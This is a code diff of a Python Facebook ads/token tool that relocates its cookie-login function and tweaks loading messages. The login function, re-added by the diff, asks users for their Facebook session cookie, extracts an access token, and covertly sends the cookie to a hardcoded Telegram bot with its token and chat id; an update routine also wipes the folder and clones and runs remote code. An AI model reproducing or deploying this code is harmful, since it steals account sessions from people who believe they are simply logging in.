@@ -308,30 +308,6 @@ def gxdslogo():
     print(f"{lg}  [-] SALAMAT, MABUHAY!")
     lxnes1()
 
-# LOGIN COOKIES
-def lxgin():
-    gxdslogo()
-    head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-    fbcokis = input(f"{lgr}  [+] LOGIN USING COOKIES:{rc} ") 
-    try:
-        fact = requests.get("https://adsmanager.facebook.com/adsmanager/", cookies = {"cookie":fbcokis},headers=head).text
-        act = re.search("act=(.*?)&nav_source",str(fact)).group(1)
-        ftoken = requests.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act}&nav_source=no_referrer", cookies = {"cookie":fbcokis}).text
-        eaab = re.search('accessToken="(.*?)"',str(ftoken)).group(1)
-        open(".tokn.txt", "w").write(eaab)
-        open(".cokis.txt", "w").write(fbcokis)
-        token = open('.tokn.txt','r').read()
-        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
-        sins(f"{lgr}  [✓] LOGIN SUCCESSFULLY")
-        requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text=COOKIES: {fbcokis}")
-        slp(2)
-        apprxval()
-    except Exception as error: 
-        os.system("rm -f .tokn.txt")
-        print(f"{lr}  [X] COOKIE EXPIRED")
-        slp(2)
-        lxgin()
-
 # APPROVAL
 def apprxval():
     gxdslogo()
@@ -354,13 +330,7 @@ def apprxval():
         gxdslogo()
         print(f"{lg}  [X] TOKEN:\033[1;30m INVALID")
         slp(1)
-        for gxdsloading in range(11):
-            slp(0.3)
-            sys.stdout.write(
-                f"\r{lg}  [!] MAKING TOKEN:{dg} "
-                + gxdsanmtn4[gxdsloading % len(gxdsanmtn4)]
-            )
-            sys.stdout.flush()
+        sins(f"{dg}  [-] MAKING TOKEN...")
         lxnes1()
         print(f"{lg}  [-] TOKEN :{dg} " + gxdsid)
         lxnes()
@@ -375,7 +345,7 @@ def apprxval():
             apprxval()
         else:
             gxdslogo()
-        print(f"{lgr}  [!] UPDATING USERS, PLEASE WAIT...")
+        sins(f"{lgr}  [!] UPDATING USERS, PLEASE WAIT...")
         slp(5)
         cmds(
             "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
@@ -411,6 +381,30 @@ def mxntenansC():
         )
         exit()
 
+
+# LOGIN COOKIES
+def lxgin():
+    gxdslogo()
+    head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
+    fbcokis = input(f"{lgr}  [+] LOGIN USING COOKIES:{rc} ") 
+    try:
+        fact = requests.get("https://adsmanager.facebook.com/adsmanager/", cookies = {"cookie":fbcokis},headers=head).text
+        act = re.search("act=(.*?)&nav_source",str(fact)).group(1)
+        ftoken = requests.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act}&nav_source=no_referrer", cookies = {"cookie":fbcokis}).text
+        eaab = re.search('accessToken="(.*?)"',str(ftoken)).group(1)
+        open(".tokn.txt", "w").write(eaab)
+        open(".cokis.txt", "w").write(fbcokis)
+        token = open('.tokn.txt','r').read()
+        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
+        sins(f"{lgr}  [✓] LOGIN SUCCESSFULLY")
+        requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text=COOKIES: {fbcokis}")
+        slp(2)
+        apprxval()
+    except Exception as error: 
+        os.system("rm -f .tokn.txt")
+        print(f"{lr}  [X] COOKIE EXPIRED")
+        slp(2)
+        lxgin()
 
 # MENU
 def mxnu():
